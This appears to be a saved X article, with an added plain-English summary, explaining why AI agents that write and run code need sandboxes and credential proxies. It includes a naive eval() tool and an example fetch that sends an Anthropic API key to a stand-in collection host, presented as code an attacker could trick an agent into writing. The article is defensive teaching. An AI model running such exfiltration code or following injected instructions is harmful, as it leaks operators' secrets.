# Why Agents Need Sandboxes — Igor Zalutski

**Source:** https://x.com/igorzij/status/2029642243418505346?s=46
**Author:** Igor Zalutski (@IgorZIJ)
**Date:** 2026-03-06

---

## Plain English Summary

**What's an "agent"?**
A regular AI call is like asking someone a single question and getting one answer. An *agent* is an AI that works in a **loop** — it keeps thinking, using tools, and acting until the job is done, without you guiding every step.

**The problem with giving agents tools**
When agents need to do repetitive work (like checking thousands of invoices), calling the AI for each one is slow and expensive. It's way more efficient to let the AI **write code** that does the repetitive part, then run that code directly.

**But running AI-generated code is dangerous**
If you just run whatever code the AI writes on your server, it has access to everything — your API keys, your database, your secrets. A malicious prompt could trick the AI into writing code that steals your credentials and sends them to an attacker.

**The solution: sandboxes**
A sandbox is like a sealed room. The AI's code runs inside it and **can't access anything outside** — no secrets, no environment variables, no host system. Even if the code is malicious, it can't do any damage.

**What about CLI agents (like Claude Code)?**
These agents are extra powerful because they can use bash, read/write files, etc. That power means they **need** to run inside a sandbox too, so they can't access things they shouldn't.

**Credentials proxy**
If the sandboxed agent needs to call external APIs (Stripe, GitHub, etc.), you don't give it the API keys directly. Instead, requests go through a **proxy** that injects the credentials on the way out. The agent never sees the actual keys.

**TL;DR:** Agents are powerful because they can act autonomously and write/run code. That same power makes them dangerous if unsandboxed. Put the agent in a locked-down environment, give it broad permissions *inside* that environment, and keep secrets outside the blast radius.

---

## Full Article (Verbatim)

Why agents need sandboxes?
Lets go all the way back to what an agent is and build from there.
What makes it an agent? Lets start with the basics.
Is this an agent?

```typescript
const response = await openai.chat.completions.create({
  model: "gpt-4o",
  messages: [{ role: "user", content: "Summarize this doc..." }]
})
```

clearly not. its just an LLM call that doesnt use any tools.
ok lets add tool calls. is this an agent now?

```typescript
if (llm_output.tool_call) {
  const result = callTool(llm_output.tool_call)
  return result
}
```

still not an agent! all it can do is if the LLM result returns a tool call, it'll call a tool. or not. but then it'll stop. it cannot proceed autonomously, it can only do 1 step - with or without tools.
an agent is a loop (that'd call and LLM repeatedly until some condition is reached)

```typescript
while (!done) {
  const plan = await llm(context)

  if (plan.tool) {
    const result = await callTool(plan.tool)
    context.push(result)
  } else {
    done = true
  }
}
```

Now that's an agent (kind of). Obviously not complete; but the basics are there - it can use tools, and it can do so repeatedly until done. It also manages its own context (note context.push() - ofc real-world context management is far more complex but this is enough for the sake of example)
There are many other challenges ahead; for example, ending the loop reliably, or managing context / memory between turns. For that reason agent frameworks were created. Here's an example of an agent loop defined vercel's AI sdk:

```typescript
function solve(goal: string) {
  messages.push({ role: "user", content: goal });

  const result = await generateText({
    model: openai("gpt-4.1-mini"),
    messages,
    tools,
    maxSteps: 6,            // loop limiting (agentic tool-call roundtrips)
    onStepFinish: (s) => {
      // observability + optional context mgmt (e.g. summarize messages here)
      // s.toolCalls / s.toolResults are available
    },
  });
```

now that's great and all, but it turns out that LLMs are especially great at generating code.
consider we are building an agent to do smth useful via Stripe API. We could have something like this (if we'd use Stripe MCP server that wouldn't be much different):

```typescript
import { generateText, tool } from "ai";
import { openai } from "@ai-sdk/openai";

const tools = {
  stripeListInvoices: tool({}),
  stripeGetInvoice: tool({}),
  dbFindExpected: tool({}),
  reportAppend: tool({}),
};

export async function reconcileJanuary() {
  return generateText({
    model: openai("gpt-4.1-mini"),
    tools,
    maxSteps: 3000, // !!! WE NEED LOTS OF STEPS HERE
    messages: [
      { role: "system", content: "Paginate; fetch each invoice; match in DB; append mismatches." },
      { role: "user", content: "Reconcile January invoices." },
    ],
  });
}
```

Note the maxSteps: 3000 line. If we do any less, we might not accomplish the goal! Because there could be lots and lots of invoices to go through. But can we actually do 3000 steps? Lets do some back-of a napkin math. If each tool call returns 500 tokens of json, by step 2000 we'd be at 1M already. With a typical 200k context we could only do 400 steps until its full (and that's not accounting for everything else that needs to be in the context).
And it not just context space - there's also cost. If we naively feed the full conversation back and forth each time, the total processed tokens for N steps would be ~500 * (1 + 2 + ... N). So just one 2000-step loop would eat up ~1B tokens! (500 * 2000 * 2001 / 2), which would be $3k, just on input, using Sonnet. We obviously shouldn't send the whole thing back and forth and that would make it much less costly; nevertheless, for such loop-like iterations it is not going to be trivial.
A much better way to consume the same API would be to make the model generate some code with SDK calls an run it like regular code in an actual loop, bypassing the LLM altogether. Models are good at generating code. Then instead of calling stripeGetInvoice() tool repeatedly and polluting the context, the model could generate a code that'd look smth like this:

```typescript
const invoices = await stripe.invoices.list({ ... } });

  for (const invoice of invoices) {
    if (!(await dbHasInvoice(invoice.id))) {
      mismatches.push(invoice.id);
    }
  }
```

But where would that code run? How do we make a model "run code" bypassing the context?
One way (don't do this!) is to just run it there and then inside our agent, exposing as a tool:

```typescript
runCode: tool({
    parameters: z.object({
      code: z.string(),
    }),
    execute: async ({ code }) => {
      // ⚠️ naive execution of model-generated code
      return await eval(`(async () => { ${code} })()`);
    },
  })
```

But that means that any code that model generates would run with the same level of privilege as your agent server. What if someone tricks your agent to generate a code like this?

```typescript
await fetch("https://api.randomsite.net/collect", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ process.env.ANTHROPIC_API_KEY })
  });
```

… and this is why agents need sandboxes! If that code would run in a sandbox, secrets could not possibly leak because it wouldn't have access to them. No matter what the code does, it's isolated from its environment:

```typescript
import { Sandbox } from "@opencomputer/sdk";
// ...
const tools = {
  runCode: tool({
    parameters: z.object({
      code: z.string(),
    }),
    execute: async ({ code }) => {
      const result = await sandbox.exec({
        cmd: ["node", "-e", code],
      });

      return result.stdout;
    },
  }),
};
```

### Sandboxing the agent itself

Above we traced the need for sandboxing from the very basics of building an agent. The agent we ended up with used vercel's ai sdk and is a fairly standard web application. It could be deployed to Vercel or Cloudflare Workers or any other containers / functions platform. There's nothing special about the agent framework - its a web app like any other, it basically just wraps LLM calls, hiding the boilerplate complexity from the user.
However after the spectacular success of Claude Code, frameworks for building CLI agents have been growing in popularity, such as Claude Agent SDK or Codex SDK. These agents are built as fully-fledged command line tools - they can read and write files, use bash, and generally mess with the environment they run in however they like. Building an agent like that may seem like a bad idea at first, but counterintuitively, such architecture makes them much more powerful - mainly because LLMs were trained on the vast corpus of public code on github and lots of it is various command line utilities for *nix operating system. The *nix command-line contract is a bit of a "lingua franca" for software; so naturally LLMs feel most comfortable with bash, grep and other *nix utilities.
Claude Agent SDK uses Claude Code CLI under the hood. So to run an agent that you've built with Claude Agent SDK, you'd need to put the agent itsef into a sandbox - otherwise the model could, in theory, access data that it shouldn't have access to (See Anthropic's official hosting recommenation)

(Image from @hwchase17's article - https://x.com/hwchase17/status/2021261552222158955)

There's a latency benefit too, instead of round tripping tool calls through your server, the agent can call APIs directly from inside the sandbox. But direct API access means credentials have to go somewhere & a compromised agent could exfiltrate them. The fix is a credential proxy that doesn't let secrets enter the sandbox. The agent makes requests to a proxy that injects credentials at the network level, so the agent can call Stripe or GitHub without ever seeing the actual key.

```
agent → proxy (injects auth header) → stripe.com
```

This way secrets stay outside the blast radius.

Ok so where are we now?

We started with a single LLM call and ended up with a sandboxed, credential proxied agent running a full CLI environment. A well sandboxed agent can have broad permissions inside its environment precisely because that environment has hard walls.

Give the agent a computer, just not your (physical) computer. :)
